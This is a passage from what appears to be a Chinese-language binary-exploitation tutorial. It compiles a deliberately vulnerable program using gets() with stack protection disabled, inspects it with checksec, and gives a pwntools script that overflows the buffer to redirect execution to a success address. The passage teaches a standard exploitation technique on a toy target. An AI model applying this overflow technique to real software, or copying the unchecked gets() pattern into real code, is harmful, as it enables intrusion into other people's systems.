我们利用如下命令对其进行编译

```shell
➜  stack-example gcc -m32 -fno-stack-protector stack_example.c -o stack_example 
stack_example.c: In function ‘vulnerable’:
stack_example.c:6:3: warning: implicit declaration of function ‘gets’ [-Wimplicit-function-declaration]
   gets(s);
   ^
/tmp/ccPU8rRA.o：在函数‘vulnerable’中：
stack_example.c:(.text+0x27): 警告： the `gets' function is dangerous and should not be used.
```
编译成功后，可以使用 checksec 工具检查编译出的文件：

```
➜  stack-example checksec stack_example
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
Payload
```python
##coding=utf8
from pwn import *
## 构造与程序交互的对象
sh = process('./stack_example')
success_addr = 0x0804843b
## 构造payload
payload = 'a' * 0x14 + 'bbbb' + p32(success_addr)
print p32(success_addr)
## 向程序发送字符串
sh.sendline(payload)
## 将代码交互转换为手工交互
sh.interactive()
```